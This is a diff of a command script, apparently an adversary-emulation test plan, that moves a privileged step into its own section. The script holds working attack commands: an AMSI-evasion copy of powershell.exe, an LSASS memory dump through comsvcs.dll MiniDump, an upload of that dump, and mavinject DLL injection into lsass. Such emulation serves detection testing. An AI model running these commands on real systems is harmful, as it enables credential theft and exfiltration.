@@ -35,12 +35,6 @@ run powershell Set-ExecutionPolicy Bypass -Scope Process -Force ; .\tweet.ps1
 run cmd.exe /c copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
 run cmd.exe /c copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
 run cmd.exe /c %APPDATA%\updater.exe -Command exit
-controller --integrity
-If step 18 does not contain "High" goto step 24
-run powershell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full
-loader --load uploader
-uploader --remotepath C:\Windows\Temp\lsass.dmp
-run powershell mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\Windows\System32\vbscript.dll
 STEP = CLEANUP
 run wmic process where name="notepad.exe" delete
 run wmic process where name="Calculator.exe" delete
@@ -53,9 +47,14 @@ run cmd.exe /c del C:\Windows\Temp\svchost.exe
 run cmd.exe /c del %APPDATA%\updater.exe
 run cmd.exe /c del %APPDATA%\amsi.dll
 run schtasks /Delete /TN CMDTestTask /F
+STEP = REQUIRES PRIV
 controller --integrity
-If step 35 does not contain "High" goto step 38
+If step 31 does not contain "High" goto step 38
+run powershell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full
+loader --load uploader
+uploader --remotepath C:\Windows\Temp\lsass.dmp
 run cmd.exe /c del C:\Windows\Temp\lsass.dmp
+run powershell mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\Windows\System32\vbscript.dll
 controller --shutdown
 ```
 
